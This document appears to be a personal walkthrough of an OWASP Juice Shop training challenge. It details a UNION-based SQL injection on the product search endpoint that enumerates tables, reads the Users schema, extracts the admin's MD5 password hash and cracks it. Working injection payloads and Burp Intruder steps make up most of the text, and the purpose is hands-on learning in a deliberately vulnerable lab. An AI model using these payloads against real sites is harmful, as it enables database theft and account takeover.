- I have access to [[admin-section]] and can login with SQL injection from [[login-admin]]. But I want to get the real password of admin in case they fix the SQL injection in the future.
- Try to find the password hash first
- Go to search bar, type to search anything
- Look at HTTP history on burp suite, see `GET /rest/products/search?q= HTTP/1.1`
- Send it to Repeater
- Try `' OR 1=1 --` to see if it is vulnerable to SQL injection or not. (Remember to highlight and click `cmd + U`)
- See
```
HTTP/1.1 500 Internal Server Error
Access-Control-Allow-Origin: *
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Feature-Policy: payment 'self'
X-Recruiting: /#/jobs
Content-Type: application/json; charset=utf-8
Vary: Accept-Encoding
Date: Thu, 02 Jul 2026 16:44:42 GMT
Connection: keep-alive
Keep-Alive: timeout=5
Content-Length: 311

{
  "error": {
    "message": "SQLITE_ERROR: incomplete input",
    "stack": "Error: SQLITE_ERROR: incomplete input",
    "errno": 1,
    "code": "SQLITE_ERROR",
    "sql": "SELECT * FROM Products WHERE ((name LIKE '%' OR 1=1 --%' OR description LIKE '%' OR 1=1 --%') AND deletedAt IS NULL) ORDER BY name"
  }
}
```
- Confirm that it is vulnerable to SQL injection 
- Try `')) OR 1=1 --` to see if it fixes the error --> Succeed

- I will now use the payload `')) ORDER BY 1--` to see the column count.
- Send it to intruder `GET /rest/products/search?q='))+ORDER+BY+§1§-- HTTP/1.1
- Let it run from 1-20
- See that the `9` has `200` but `10` has the error `500`
- Know that there are 9 columns
- Now, do `')) UNION SELECT 1, tbl_name, 3, 4, 5, 6, 7, 8, 9 FROM sqlite_master WHERE type='table'--` to see the table name
- See
```
{"id":1,"name":"Addresses","description":"3","price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"Apple Juice (1000ml)","description":"The all-time classic.","price":1.99,"deluxePrice":0.99,"image":"apple_juice.jpg","createdAt":"2026-07-02 13:53:00.061 +00:00","updatedAt":"2026-07-02 13:53:00.061 +00:00","deletedAt":null},{"id":1,"name":"BasketItems","description":"3","price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"Baskets","description":"3","price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"Captchas","description":"3","price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"Cards","description":"3","price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"ChallengeDependencies","description":"3","price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"Challenges","description":"3","price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"Complaints","description":"3","price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"Deliveries","description":"3","price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"Feedbacks","description":"3","price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"Hints","description":"3","price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"ImageCaptchas","description":"3","price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"Memories","description":"3","price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"PrivacyRequests","description":"3","price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"Products","description":"3","price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"Quantities","description":"3","price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"Recycles","description":"3","price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"SecurityAnswers","description":"3","price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"SecurityQuestions","description":"3","price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"Users","description":"3","price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"Wallets","description":"3","price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":1,"name":"sqlite_sequence","description":"3","price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},
```
- I see the table `Users`, which is the target table
- Try to get the schema with `')) UNION SELECT 1, sql, 3, 4, 5, 6, 7, 8, 9 FROM sqlite_master WHERE tbl_name='Users'--`
- Get the `Unexpected path` error
- Try changing the location of `sql`. 
	- 1 works
	- 2 does not work
	- 3 does not work
	- 4 works
	- ...
- The only explanation I can come up with is that `id` and `price` are just numbers that get coerced/parsed and passed through untouched, while `name` or `description` position hits some string-processing step downstream that isn't happy with that content and throws — and because `search.js` doesn't wrap that specific step in a try/catch, the unhandled exception propagates past the route entirely, and Express's fallback path-serving middleware is what ends up formatting the final error (hence the misleading "Unexpected path" message)
- `')) UNION SELECT 1, 2, 3, sql, 5, 6, 7, 8, 9 FROM sqlite_master WHERE tbl_name='Users'--`
- See the schema
```
"CREATE TABLE `Users` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `username` VARCHAR(255) DEFAULT '', `email` VARCHAR(255) UNIQUE, `password` VARCHAR(255), `role` VARCHAR(255) DEFAULT 'customer', `deluxeToken` VARCHAR(255) DEFAULT '', `lastLoginIp` VARCHAR(255) DEFAULT '0.0.0.0', `profileImage` VARCHAR(255) DEFAULT '/assets/public/images/uploads/default.svg', `totpSecret` VARCHAR(255) DEFAULT '', `isActive` TINYINT(1) DEFAULT 1, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `deletedAt` DATETIME)"
```
- Now, do `')) UNION SELECT 1, 2, email, password, 5, 6, 7, 8, 9 FROM Users WHERE email='admin@juice-sh.op'--`
- See
```
{"id":1,"name":"2","description":"admin@juice-sh.op","price":"0192023a7bbd73250516f069df18b500","deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},
```
- From the hash, I can have a solid guess that it is MD5 (I hope that it is unsalted and that it is simple though)
- Reverse the MD5 hash with rainbow table with https://md5.gromweb.com/
- See the password being `admin123`
- Login with it and complete the challenge